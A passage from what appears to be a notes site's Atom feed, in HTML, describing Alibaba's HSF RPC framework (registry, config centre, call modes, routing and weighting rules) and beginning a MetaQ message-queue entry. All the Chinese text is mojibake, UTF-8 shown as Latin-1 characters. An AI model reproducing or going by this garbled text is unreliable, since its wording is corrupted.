<p>HSFåŠŸèƒ½ç»“æ„ä¸Šåˆ†ä¸º6ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯ï¼šæœåŠ¡æ¶ˆè´¹æ–¹ã€æœåŠ¡æä¾›æ–¹ã€åœ°å€æ³¨å†Œä¸­å¿ƒã€æŒä¹…åŒ–é…ç½®ä¸­å¿ƒã€å…ƒæ•°æ®å­˜å‚¨ä¸­å¿ƒå’ŒHSFè¿ç»´å¹³å°ï¼ˆHSF æ§åˆ¶å°ï¼‰ï¼Œå®ƒä»¬ç»„åˆåœ¨ä¸€èµ·å¯ä»¥æä¾›å…¨åŠŸèƒ½çš„åˆ†å¸ƒå¼æœåŠ¡ï¼Œå…¶ä¸­å¿…é¡»çš„æ˜¯æœåŠ¡æ¶ˆè´¹æ–¹ã€æœåŠ¡æä¾›æ–¹å’Œåœ°å€æ³¨å†Œä¸­å¿ƒï¼Œä¸Šè¿°åŠŸèƒ½ç»“æ„çš„æè¿°å¦‚ä¸‹è¡¨ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:left">åç§°</th>
<th style="text-align:center">æ˜¯å¦å¿…é¡»</th>
<th style="text-align:left">åŠŸèƒ½æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">æœåŠ¡æ¶ˆè´¹æ–¹</td>
<td style="text-align:center">æ˜¯</td>
<td style="text-align:left">æ¶ˆè´¹æœåŠ¡æä¾›æ–¹æä¾›çš„æœåŠ¡ï¼ŒæœåŠ¡æ¶ˆè´¹è€…é€šè¿‡åœ°å€æ³¨å†Œä¸­å¿ƒè®¢é˜…æœåŠ¡ï¼Œæ ¹æ®è®¢é˜…åˆ°çš„åœ°å€ä¿¡æ¯å‘èµ·è°ƒç”¨ï¼Œåœ°å€æ³¨å†Œä¸­å¿ƒä½œä¸ºæ—è·¯ä¸å‚ä¸è°ƒç”¨</td>
</tr>
<tr>
<td style="text-align:left">æœåŠ¡æä¾›æ–¹</td>
<td style="text-align:center">æ˜¯</td>
<td style="text-align:left">æœåŠ¡æä¾›æ–¹ä¼šç»‘å®šä¸€ä¸ªç«¯å£ï¼ˆä¸€èˆ¬æ˜¯12200ï¼‰ï¼Œæ¥å—è¯·æ±‚å¹¶æä¾›æœåŠ¡ï¼ŒåŒæ—¶å°†åœ°å€ä¿¡æ¯å‘å¸ƒåˆ°åœ°å€æ³¨å†Œä¸­å¿ƒ</td>
</tr>
<tr>
<td style="text-align:left">åœ°å€æ³¨å†Œä¸­å¿ƒ</td>
<td style="text-align:center">æ˜¯</td>
<td style="text-align:left">æ¥å—æœåŠ¡æä¾›æ–¹å‘å¸ƒçš„åœ°å€ï¼Œå½“æœåŠ¡æ¶ˆè´¹æ–¹æ ¹æ®æœåŠ¡è¿›è¡Œè®¢é˜…æ—¶ï¼Œä¼šå°†åœ°å€ä¿¡æ¯æ¨é€ç»™æœåŠ¡æ¶ˆè´¹æ–¹ï¼Œæ³¨å†Œä¸­å¿ƒå°±æ˜¯æœåŠ¡ä¿¡æ¯çš„ä¸­ä»‹ï¼Œæä¾›æœåŠ¡å‘ç°çš„èƒ½åŠ›</td>
</tr>
<tr>
<td style="text-align:left">æŒä¹…åŒ–é…ç½®ä¸­å¿ƒ</td>
<td style="text-align:center">å¦</td>
<td style="text-align:left">æŒä¹…åŒ–çš„é…ç½®ä¸­å¿ƒç”¨äºå­˜å‚¨ HSF æœåŠ¡çš„å„ç§æ²»ç†è§„åˆ™ï¼ŒHSF å®¢æˆ·ç«¯åœ¨å¯åŠ¨çš„è¿‡ç¨‹ä¸­ä¼šå‘æŒä¹…åŒ–é…ç½®ä¸­å¿ƒè®¢é˜…å„ç§æœåŠ¡æ²»ç†è§„åˆ™ï¼Œå¦‚è·¯ç”±è§„åˆ™ã€å½’ç»„è§„åˆ™ã€æƒé‡è§„åˆ™ç­‰ï¼Œä»è€Œæ ¹æ®è§„åˆ™å¯¹è°ƒç”¨è¿‡ç¨‹çš„é€‰å€é€»è¾‘è¿›è¡Œå¹²é¢„</td>
</tr>
<tr>
<td style="text-align:left">å…ƒæ•°æ®å­˜å‚¨ä¸­å¿ƒ</td>
<td style="text-align:center">å¦</td>
<td style="text-align:left">å…ƒæ•°æ®æ˜¯æŒ‡ HSF æœåŠ¡å¯¹åº”çš„æ–¹æ³•åˆ—è¡¨ä»¥åŠå‚æ•°ç»“æ„ç­‰ä¿¡æ¯ï¼Œå…ƒæ•°æ®ä¸ä¼šå¯¹ HSF çš„è°ƒç”¨è¿‡ç¨‹äº§ç”Ÿå½±å“ï¼Œå› æ­¤å…ƒæ•°æ®å­˜å‚¨ä¸­å¿ƒä¹Ÿå¹¶ä¸æ˜¯å¿…é¡»çš„ã€‚ä½†è€ƒè™‘åˆ°æœåŠ¡è¿ç»´çš„ä¾¿æ·æ€§ï¼ŒHSFå®¢æˆ·ç«¯åœ¨å¯åŠ¨æ—¶ä¼šå°†å…ƒæ•°æ®ä¸ŠæŠ¥åˆ°å…ƒæ•°æ®å­˜å‚¨ä¸­å¿ƒï¼Œä»¥ä¾¿æä¾›ç»™æœåŠ¡è¿ç»´ä½¿ç”¨</td>
</tr>
<tr>
<td style="text-align:left">HSFè¿ç»´å¹³å°</td>
<td style="text-align:center">å¦</td>
<td style="text-align:left">HSF æ§åˆ¶å°é€šè¿‡æ‰“é€šåœ°å€æ³¨å†Œä¸­å¿ƒ ConfigServerã€æŒä¹…åŒ–é…ç½®ä¸­å¿ƒ Diamondã€å…ƒæ•°æ®å­˜å‚¨ä¸­å¿ƒ Redisï¼Œä¸ºç”¨æˆ·æä¾›äº†ä¸€äº›åˆ—æœåŠ¡è¿ç»´åŠŸèƒ½ï¼ŒåŒ…æ‹¬æœåŠ¡æŸ¥è¯¢ã€æœåŠ¡æ²»ç†è§„åˆ™ç®¡ç†ã€æœåŠ¡æµ‹è¯•ã€æœåŠ¡ Mockã€å•æœºè¿ç»´ç­‰ï¼Œæ—¨åœ¨æé«˜ HSF æœåŠ¡ç ”å‘çš„æ•ˆç‡ã€è¿ç»´çš„ä¾¿æ·æ€§</td>
</tr>
</tbody>
</table>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-15-25-26.png" alt="" loading="lazy"></p>
<p>ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡æä¾›æ–¹åœ¨å¯åŠ¨åä¼šå‘åœ°å€æ³¨å†Œä¸­å¿ƒå‘å¸ƒåœ°å€ï¼ŒæœåŠ¡æ¶ˆè´¹æ–¹æ ¹æ®æœåŠ¡åå‘åœ°å€æ³¨å†Œä¸­å¿ƒè®¢é˜…æœåŠ¡åœ°å€ï¼Œå½“æœåŠ¡åœ°å€æ¨é€åˆ°æœåŠ¡æ¶ˆè´¹æ–¹åï¼ŒæœåŠ¡æ¶ˆè´¹æ–¹å°±å¯ä»¥ä»åœ°å€åˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªåœ°å€å‘èµ·RPCè°ƒç”¨ã€‚</p>
<p>æœåŠ¡æä¾›æ–¹åœ¨å‘å¸ƒåœ°å€çš„åŒæ—¶ä¼šå°†æœåŠ¡å…ƒä¿¡æ¯å‘å¸ƒåˆ°å…ƒæ•°æ®å­˜å‚¨ä¸­å¿ƒï¼ŒHSFæ§åˆ¶å°é€šè¿‡è®¿é—®å…ƒæ•°æ®å­˜å‚¨ä¸­å¿ƒå‘ä½¿ç”¨è€…å±•ç¤ºæœåŠ¡çš„è¯¦æƒ…ï¼ŒåŒæ—¶HSFæ§åˆ¶å°è¿˜å¯ä»¥é€šè¿‡æŒä¹…åŒ–é…ç½®ä¸­å¿ƒå’Œåœ°å€æ³¨å†Œä¸­å¿ƒå®¢æˆ·ç«¯æŸ¥è¯¢æœåŠ¡ä¿¡æ¯å’Œè§„åˆ™ä¿¡æ¯ã€‚</p>
<h3 id="æ¨¡å—" tabindex="-1"> æ¨¡å—</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-15-26-46.png" alt="" loading="lazy"></p>
<ul>
<li>åœ°å€æ³¨å†Œä¸­å¿ƒï¼šConfigServerå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªIPåœ°å€çš„ç®¡ç†ä¸­å¿ƒï¼Œå®ƒè´Ÿè´£å‘æ¶ˆè´¹è€…ç”¨æˆ·æ¥æ¨é€æœåŠ¡ç«¯çš„åœ°å€ï¼Œæ‰€ä»¥å¼€å‘äººå‘˜åªéœ€è‡ªå·±é…ç½®æ¶ˆè´¹ç«¯æˆ–è€…æœåŠ¡ç«¯çš„åœ°å€å°±å¥½ã€‚<strong>æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½ä¼šè·ŸCSå»ºç«‹é•¿è¿æ¥ï¼Œå¹¶ä¸”é€šè¿‡å¿ƒè·³åŒ…è¿›è¡Œç»´æŒ</strong>ã€‚</li>
<li>é…ç½®ä¸­å¿ƒï¼šå¯¹äºåˆ†å¸ƒå¼æœåŠ¡ï¼Œå®¢æˆ·ç«¯å¦‚ä½•è°ƒç”¨å®ç°è´Ÿè½½å‡è¡¡ã€‚è§„åˆ™é…ç½®ä¸­å¿ƒDiamondï¼Œå°±æ˜¯ç”¨äºå­˜æ”¾HSFçš„å„ç§è§„åˆ™ï¼Œæ˜¯ä¸€ä¸ªæŒä¹…åŒ–çš„é…ç½®ä¸­å¿ƒï¼Œè¿™é‡Œå®¢æˆ·ç«¯æ˜¯ä¸»åŠ¨ä»Diamondä¸Šè¿›è¡Œæ‹‰å–é…ç½®ï¼Œå¹¶ä¸”æ³¨å†Œäº†Listenerï¼Œå½“è·¯ç”±è§„åˆ™å˜åŒ–æ—¶ï¼ŒDiamondä¼šå°†æ–°çš„è§„åˆ™é‡æ–°æ¨é€ç»™å®¢æˆ·ç«¯ï¼Œæ‰€ä»¥ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦ä¸Diamondä¿æŒé•¿è¿æ¥ã€‚</li>
<li>å®¹å™¨pandoraï¼špandoraæ˜¯HSFçš„åŸºç¡€å®¹å™¨ï¼Œç”¨äºç®¡ç†æ•´ä¸ªHSFçš„ç”Ÿå‘½å‘¨æœŸå’ŒäºŒæ–¹åŒ…çš„éš”ç¦»ï¼ŒåŒæ—¶ï¼Œå…¶ä»–çš„å‡ ä¸ªä¸­é—´ä»¶ï¼ŒconfigServerå’ŒDiamondä¹Ÿåœ¨pandoraå®¹å™¨ä¸­ã€‚</li>
</ul>
<h3 id="å†…éƒ¨æ¡†æ¶" tabindex="-1"> å†…éƒ¨æ¡†æ¶</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-17-11.png" alt="" loading="lazy"></p>
<p>è¿™4å—é¢†åŸŸä»ä¸‹åˆ°ä¸Šï¼Œåˆ†åˆ«æ˜¯ï¼šæ¡†æ¶ã€åº”ç”¨ã€æœåŠ¡å’Œé…ç½®ã€‚æ¡†æ¶æä¾›äº†åŸºç¡€åŠŸèƒ½ï¼Œè´Ÿè´£é€šä¿¡ã€çº¿ç¨‹ã€åè®®ã€åºåˆ—åŒ–ä»¥åŠç¼–è§£ç ç›¸å…³çš„å·¥ä½œï¼Œå®ƒä»¬æä¾›äº†è‰¯å¥½çš„æŠ½è±¡ï¼Œæ¡†æ¶ä¹‹ä¸Šçš„åŸŸåªéœ€è¦åŸºäºè¿™äº›æŠ½è±¡å°±èƒ½å®Œæˆä¸€æ¬¡é«˜æ€§èƒ½çš„è°ƒç”¨ã€‚</p>
<p>åº”ç”¨ä¸»è¦é¢å‘æœåŠ¡æ¡†æ¶çš„æ³¨å†Œå’Œå‘ç°è¿‡ç¨‹ï¼Œæ˜¯HSFå®Œæˆåˆ†å¸ƒå¼è°ƒç”¨çš„åŸºç¡€ï¼Œå®ƒç”¨æ¥æ”¯æ’‘æœåŠ¡ã€‚æœåŠ¡çš„ç²’åº¦æ¯”åº”ç”¨å°ï¼Œå®ƒåŒ…å«äº†è°ƒç”¨é“¾è·¯ã€åœ°å€è·¯ç”±ä»¥åŠè´Ÿè½½å‡è¡¡ç­‰åŠŸèƒ½ã€‚åœ¨æœåŠ¡ä¹‹ä¸Šæ˜¯é…ç½®ï¼Œç”¨æˆ·ä½¿ç”¨APIæ¥å¯¹å„å±‚è¿›è¡Œé…ç½®ï¼Œå¹¶ç”Ÿæˆè°ƒç”¨çš„ä»£ç†æˆ–æš´éœ²æœåŠ¡ã€‚</p>
<p>æ²¿ç€å®¢æˆ·ç«¯é…ç½®é“¾è·¯å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·é…ç½®äº†è°ƒç”¨çš„æ¥å£ã€ç‰ˆæœ¬ä»¥åŠåˆ†ç»„åï¼Œå¯ä»¥æŒ‡å®šè´Ÿè½½å‡è¡¡ç­–ç•¥ã€æ³¨å†Œä¸­å¿ƒç±»å‹ä»¥åŠæ”¯æŒä½•ç§åè®®ï¼Œå½“é…ç½®å®Œæˆåï¼Œå°±å¯ä»¥ç”Ÿæˆå®¢æˆ·ç«¯ä»£ç†ï¼Œå¼€å§‹è¿œç¨‹è°ƒç”¨äº†ã€‚æœåŠ¡ç«¯é…ç½®æœ‰æ‰€ä¸åŒï¼Œé™¤äº†é…ç½®æ³¨å†Œä¸­å¿ƒä»¥å¤–ï¼Œè¿˜å¯ä»¥é…ç½®åºåˆ—åŒ–æ–¹å¼ä»¥åŠçº¿ç¨‹æ± ï¼Œè¿™äº›éƒ½ä¼šå½±å“æœåŠ¡ç«¯çš„æœåŠ¡èƒ½åŠ›ã€‚</p>
<p>æœåŠ¡æ³¨å†Œå‘ç°é“¾è·¯æ¯”è¾ƒç®€å•ï¼Œå®ƒä»¬è´¯ç©¿åœ¨åè®®æµç¨‹ä¸­ï¼Œè´Ÿè´£æ³¨å†Œåœ°å€æˆ–è€…è®¢é˜…æœåŠ¡ã€‚</p>
<p>è°ƒç”¨é“¾è·¯ä»å®¢æˆ·ç«¯å‘èµ·è°ƒç”¨å¼€å§‹ï¼Œç»å†äº†å®¢æˆ·ç«¯çš„é€‰å€å’Œè´Ÿè½½å‡è¡¡åï¼Œå°†å‚æ•°å¯¹è±¡å®Œæˆåºåˆ—åŒ–ï¼Œç»è¿‡æ¡†æ¶åè®®ç¼–ç åï¼Œé€šè¿‡ç½‘ç»œå±‚å‘é€å‡ºå»ã€‚æœåŠ¡ç«¯æ¥å—åˆ°æ•°æ®åè¿›è¡Œè§£ç ï¼Œè§£ç è·å¾—çš„äºŒè¿›åˆ¶åè®®æ´¾å‘åˆ°æœåŠ¡ç«¯çº¿ç¨‹å®Œæˆååºåˆ—åŒ–ï¼Œç”Ÿæˆå‡ºå‚æ•°å¯¹è±¡ï¼Œæœ€ç»ˆå®Œæˆåå°„è°ƒç”¨ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-17-16-49-26.png" alt="" loading="lazy"></p>
<h3 id="è°ƒç”¨æ–¹å¼" tabindex="-1"> è°ƒç”¨æ–¹å¼</h3>
<ul>
<li>åŒæ­¥å®æ—¶è°ƒç”¨ï¼šHSFçš„IOæ“ä½œéƒ½æ˜¯å¼‚æ­¥çš„ï¼Œè¿™é‡Œçš„åŒæ­¥å…¶æœ¬è´¨æ˜¯åšfuture.get(timeout)åœ¨è¿™ä¸ªç‚¹ç­‰å¾…æœåŠ¡ç«¯çš„è¿”å›</li>
<li>Futureå¼‚æ­¥è°ƒç”¨</li>
<li>Callbackå¼‚æ­¥è°ƒç”¨ï¼ˆå®¢æˆ·ç«¯éœ€æä¾›å›è°ƒæ–¹æ³•ï¼‰</li>
<li>Genericè°ƒç”¨ï¼ˆä¸ä¾èµ–äºŒæ–¹åŒ…ï¼Œé€šè¿‡ä¼ å…¥æ–¹æ³•åï¼Œæ–¹æ³•ç­¾åå’Œå‚æ•°å€¼çš„æ–¹å¼è°ƒç”¨æœåŠ¡ï¼‰</li>
<li>æœåŠ¡ç«¯asyncè°ƒç”¨ï¼ˆåº”ç”¨å°†é€šè¿‡AsyncContextå†™å“åº”ï¼‰</li>
<li>HTTPè°ƒç”¨HSF(ä»2.1.1.6ç‰ˆæœ¬å¼€å§‹)</li>
</ul>
<p>æ­¤å¤–Nodeï¼Œ C++éƒ½æ˜¯å¯ä»¥ä½¿ç”¨HSFçš„</p>
<h4 id="å…¼å®¹è°ƒç”¨" tabindex="-1"> å…¼å®¹è°ƒç”¨</h4>
<p>ä¸€æ¬¡è¿œç¨‹æœåŠ¡è°ƒç”¨éƒ½è¦ç»è¿‡ä»£ç†å±‚ï¼Œåè®®å±‚å’ŒIOå±‚ï¼Œå…¶ä¸­åœ¨åè®®å±‚ï¼Œä¼šæ ¹æ®æœåŠ¡æä¾›è€…æ”¯æŒçš„åè®®é€‰æ‹©ä¸åŒçš„åè®®è¿›è¡Œé€šä¿¡ï¼Œå¦‚æœæœåŠ¡æä¾›è€…æ˜¯DUBBOï¼Œé‚£ä¹ˆå°±ä¼šæ ¹æ®å…¶æ”¯æŒçš„åè®®é€‰æ‹©DUBBO1æˆ–è€…DUBBO2åè®®è¿›è¡Œä¼ è¾“ï¼Œä¸Šå±‚æœåŠ¡è°ƒç”¨è€…ä¸ä¼šæ„ŸçŸ¥åˆ°ä»»ä½•ä¸åŒã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-15-27-47.png" alt="" loading="lazy"></p>
<h3 id="è´Ÿè½½ä½“ç³»" tabindex="-1"> è´Ÿè½½ä½“ç³»</h3>
<p>HSFæ¶ˆè´¹è€…å¯åŠ¨çš„æ—¶å€™ï¼Œä¼šå‘ConfigServeræ³¨å†Œè‡ªå·±è®¢é˜…çš„æœåŠ¡ä¿¡æ¯ï¼Œç„¶åCSä¼šå°†è¯¥æœåŠ¡çš„æ‰€æœ‰æä¾›è€…IPæ¨é€ç»™å®¢æˆ·ç«¯ï¼Œè¿™æ—¶å®¢æˆ·ç«¯å°±ä¼šæ ¹æ®ä»é…ç½®ä¸­å¿ƒDiamondä¸Šæ‹‰ä¸‹çš„è§„åˆ™å¯¹è¿™äº›IPè¿›è¡Œåˆ†ç±»ç»„è£…ï¼Œç„¶åè¿”å›ç»™Consumerå»éšæœºè°ƒç”¨ï¼Œå®ç°è½¯è´Ÿè½½çš„åŠŸèƒ½ã€‚è§„åˆ™çš„å‘å¸ƒéƒ½å¯ä»¥åœ¨hsfopså¹³å°ç»Ÿä¸€å‘å¸ƒã€‚</p>
<ol>
<li>è·¯ç”±è§„åˆ™ï¼šä¼˜å…ˆçº§æ˜¯å‚æ•°çº§è·¯ç”± &gt; æ–¹æ³•çº§è·¯ç”± &gt; æ¥å£çº§è·¯ç”±</li>
<li>å½’ç»„è§„åˆ™ï¼šæ¯ä¸ªåº”ç”¨å”¯ä¸€çš„ä¸€ä¸ªå½’ç»„ï¼Œåªæœ‰ç›¸åŒå½’ç»„çš„æœåŠ¡ï¼ˆgroupï¼‰æ‰èƒ½è°ƒç”¨ï¼Œå¯¹äºå‘å¸ƒäº†åŒä¸€HSFæœåŠ¡çš„æ‰€æœ‰æœºå™¨çš„ä¸€ä¸ªåˆ†ç»„ã€‚ï¼ˆå¦‚æœä¸æ¸…æ¥šï¼Œä¸€èˆ¬ä¸è¦é…ç½®ï¼‰ã€‚</li>
<li>åŒæœºæˆ¿ä¼˜å…ˆè§„åˆ™ï¼šHSFæœºæˆ¿æµé‡æ§åˆ¶è§„åˆ™ç”¨äºå¯¹è·¨æœºæˆ¿é—´çš„HSFè°ƒç”¨æµé‡è¿›è¡Œè§„åˆ’æ§åˆ¶ï¼Œèƒ½å¤Ÿä¿è¯HSFæœåŠ¡æ¶ˆè´¹è€…åœ¨è¯·æ±‚HSFæœåŠ¡æ—¶ï¼Œä¼˜å…ˆé€‰æ‹©ä¸æœåŠ¡æ¶ˆè´¹è€…åŒæœºæˆ¿çš„æœåŠ¡æä¾›è€…ã€‚åŒæœºæˆ¿è§„åˆ™é»˜è®¤æ˜¯å…³é—­çš„ã€‚åŒæ ·åœ¨opsä¸Šé…ç½®ã€‚æœ‰3ä¸ªè§„åˆ™å±æ€§ï¼š</li>
</ol>
<ul>
<li>localPreferredSwitchï¼š on|off</li>
<li>thresholdï¼š floatå€¼ï¼Œç”Ÿæ•ˆé˜€å€¼çš„è®¡ç®—æ–¹æ³•ï¼šæœåŠ¡å¯ç”¨æ¯”ä¾‹=æœ¬æœºæˆ¿å¯ç”¨æœºå™¨æ•°é‡/æœåŠ¡æ‰€æœ‰æœºæˆ¿çš„æœºå™¨æ€»é‡å½“æœåŠ¡å¯ç”¨æ¯”ä¾‹&gt;=thresholdæ—¶ï¼Œå¯ç”¨æœ¬åœ°æœºæˆ¿ä¼˜å…ˆç­–ç•¥å½“æœåŠ¡å¯ç”¨æ¯”ä¾‹å°äºthresholdæ—¶ï¼Œæœ¬åœ°æœºæˆ¿ä¼˜å…ˆç­–ç•¥å…³é—­ï¼ŒæœåŠ¡ä»ç„¶é‡‡ç”¨éšæœºè°ƒç”¨çš„æ–¹å¼</li>
<li>exclusionsï¼šå¦‚æœæœŸæœ›è¯¥è§„åˆ™åªå¯¹ä¸€éƒ¨åˆ†æœºå™¨ç”Ÿæ•ˆï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸€å±æ€§é…ç½®éœ€è¦æ’é™¤çš„IPï¼Œæ¯”å¦‚ï¼š172.24.*,å°†è¡¨ç¤ºè¯¥è§„åˆ™ä¸ä¼šåº”ç”¨äºæ‰€æœ‰172.24æ‰“å¤´çš„IPã€‚</li>
</ul>
<ol start="4">
<li>æƒé‡è§„åˆ™ï¼šä½¿ç”¨åœºæ™¯ä¸€èˆ¬æ˜¯å‹æµ‹æˆ–è€…æœºå™¨çš„é…ç½®ä¸å‡è¡¡ã€‚</li>
</ol>
<h2 id="dubbo" tabindex="-1"> Dubbo</h2>
<p><a href="/notes/%E6%A1%86%E6%9E%B6/Dubbo.md" target="_blank" rel="noopener noreferrer">Dubboè¯¦ç»†å†…å®¹</a></p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">MetaQ</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<p>åˆ†å¸ƒå¼æ¶ˆæ¯çš„ä¸»è¦ç›®çš„æ˜¯ï¼šè§£è€¦ã€æ»‘å³°å¡«è°·ï¼Œä¿è¯æœ€ç»ˆä¸€è‡´æ€§</p>
<h1 id="metaq" tabindex="-1"> MetaQ</h1>
<p>MetaQæ˜¯ä¸€æ¬¾åˆ†å¸ƒå¼ã€é˜Ÿåˆ—æ¨¡å‹çš„æ¶ˆæ¯ä¸­é—´ä»¶ã€‚åˆ†ä¸ºTopicä¸Queueä¸¤ç§æ¨¡å¼ï¼ŒPushï¼ˆåå°è½®è¯¢pullï¼‰å’ŒPullä¸¤ç§æ–¹å¼æ¶ˆè´¹ï¼Œæ”¯æŒä¸¥æ ¼çš„æ¶ˆæ¯é¡ºåºï¼Œäº¿çº§åˆ«çš„å †ç§¯èƒ½åŠ›ï¼ˆè¶…è¿‡åè®¢é˜…æ¶ˆæ¯ååé‡ä¼šä¸‹é™ï¼‰ï¼Œæ”¯æŒæ¶ˆæ¯å›æº¯ï¼ˆåŸºäºæ—¶é—´çš„å›æº¯æ¶ˆè´¹ï¼Œï¼‰å’Œå¤šä¸ªç»´åº¦çš„æ¶ˆæ¯æŸ¥è¯¢ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-23-25.png" alt="" loading="lazy"></p>
<h2 id="åº”ç”¨åœºæ™¯" tabindex="-1"> åº”ç”¨åœºæ™¯</h2>
<ul>
<li>å¡«â¾•å‰Šå³°ï¼Œå¦‚èšâ½¯å¡”æ¶ˆæ¯æ¨é€</li>
<li>å’Œç²¾å«é…åˆåšbinlogåŒæ­¥ã€å¼‚æ­¥åˆ†å‘ï¼ŒTCã€ICã€UICã€å½©ç¥¨ç­‰</li>
<li>è®¢å•ç±»åº”â½¤ï¼Œå¦‚â¼©å¾®â¾¦èçš„åŸºâ¾¦ç†è´¢ã€é˜¿â¾¥äº‘å®˜â½¹å”®å–è™šæ‹Ÿæœºç­‰</li>
<li>æµè®¡ç®—ç±»åº”â½¤ï¼Œâ½å¦‚å®æ—¶ç›´æ’­é—´</li>
<li>IMç­‰å®æ—¶æ¶ˆæ¯é¢†åŸŸï¼Œå¦‚é’‰é’‰çš„æ¶ˆæ¯æ€»çº¿</li>
<li>â¼´æ’­â½…å¼cacheåŒæ­¥</li>
</ul>
<h2 id="æ¶æ„" tabindex="-1"> æ¶æ„</h2>
<h3 id="æ¶ˆæ¯æ¨¡å‹" tabindex="-1"> æ¶ˆæ¯æ¨¡å‹</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-23-59.png" alt="" loading="lazy"></p>
<ul>
<li>Producerï¼šæ¶ˆæ¯ç”Ÿäº§è€…ï¼Œè´Ÿè´£äº§ç”Ÿæ¶ˆæ¯å¹¶å‘é€æ¶ˆæ¯åˆ°metaæœåŠ¡å™¨</li>
<li>Consumerï¼šæ¶ˆæ¯æ¶ˆè´¹è€…ï¼Œè´Ÿè´£æ¶ˆè´¹æ¶ˆæ¯ï¼Œä¸€èˆ¬æ˜¯åå°ç³»ç»Ÿè´Ÿè´£å¼‚æ­¥æ¶ˆè´¹ã€‚</li>
<li>Brokerï¼šMetaqçš„æœåŠ¡å™¨</li>
<li>Topicï¼šæ¶ˆæ¯çš„ä¸»é¢˜,ç”±ç”¨æˆ·å®šä¹‰å¹¶åœ¨æœåŠ¡ç«¯é…ç½®</li>
<li>Messageï¼šåœ¨ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…ï¼ŒæœåŠ¡å™¨é—´ä¼ é€’çš„æ¶ˆæ¯</li>
<li>Groupï¼šç»„åï¼Œä¸€ç±»Producer/Consumerçš„é›†åˆåç§°ï¼Œé€šå¸¸ç§°ä¸ºProducer/Consumeré›†ç¾¤</li>
<li>Offsetï¼šæ¶ˆæ¯åœ¨æœåŠ¡å™¨ä¸Šçš„æ¯ä¸ªåˆ†åŒºéƒ½æ˜¯ç»„ç»‡æˆä¸€ä¸ªæ–‡ä»¶åˆ—è¡¨,æ¶ˆè´¹è€…æ‹‰å–æ•°æ®éœ€è¦çŸ¥é“æ•°æ®åœ¨æ–‡ä»¶ä¸­çš„åç§»é‡,è¿™ä¸ªåç§»é‡å°±æ˜¯æ‰€è°“çš„offsetã€‚</li>
</ul>
<h3 id="ç‰©ç†æ¨¡å‹" tabindex="-1"> ç‰©ç†æ¨¡å‹</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-24-53.png" alt="" loading="lazy"></p>
<p>å„ç»„ä»¶åŠŸèƒ½ä¸ºï¼š</p>
<ul>
<li>Name Serverï¼šæ³¨å†ŒæœåŠ¡å™¨ï¼ŒName Server æ˜¯ä¸€ä¸ªå‡ ä¹æ— çŠ¶æ€èŠ‚ç‚¹ï¼Œå¯é›†ç¾¤éƒ¨ç½²ï¼ŒèŠ‚ç‚¹ä¹‹é—´æ— ä»»ä½•ä¿¡æ¯åŒæ­¥ã€‚name serverä¿å­˜topicä¸brokeré›†ç¾¤çš„å¯¹åº”å…³ç³»ï¼Œå†³å®šå“ªä¸ªtopicè·¯ç”±åˆ°å“ªä¸ªbrokeré›†ç¾¤ã€‚åœ¨broker æ³¨å†Œtopicä¿¡æ¯çš„æ—¶å€™ï¼Œå†™å…¥æ‰€æœ‰èŠ‚ç‚¹ã€‚</li>
<li>Brokerï¼šå­˜å‚¨è½¬å‘æœåŠ¡å™¨ï¼Œæ¯ä¸ªbrokeréœ€è¦ä¸æ‰€æœ‰çš„name serverå»ºç«‹é•¿è¿æ¥ï¼Œä»è€Œè·å–topicä¿¡æ¯ï¼›åˆ†ä¸ºmasterå’Œå®¹ç¾çš„slaverï¼ŒMaster ä¸Slave çš„å¯¹åº”å…³ç³»é€šè¿‡æŒ‡å®šç›¸åŒçš„BrokerNameï¼Œä¸åŒBrokerId æ¥å®šä¹‰</li>
<li>Producerï¼šæ¶ˆæ¯å‘é€æ–¹ï¼Œéœ€è¦ä¸å…¶ä¸­ä¸€ä¸ªname serverå»ºç«‹è¿æ¥ï¼Œè·å¾—è·¯ç”±ä¿¡æ¯ï¼Œå†ä¸ä¸»é¢˜å¯¹åº”çš„brokerå»ºç«‹é•¿è¿æ¥ä¸”å®šæ—¶å‘masterå‘é€å¿ƒè·³ï¼›æ¶ˆæ¯ç”±producerå‘é€åˆ°masterï¼Œå†ç”±masteråŒæ­¥åˆ°æ‰€æœ‰broker</li>
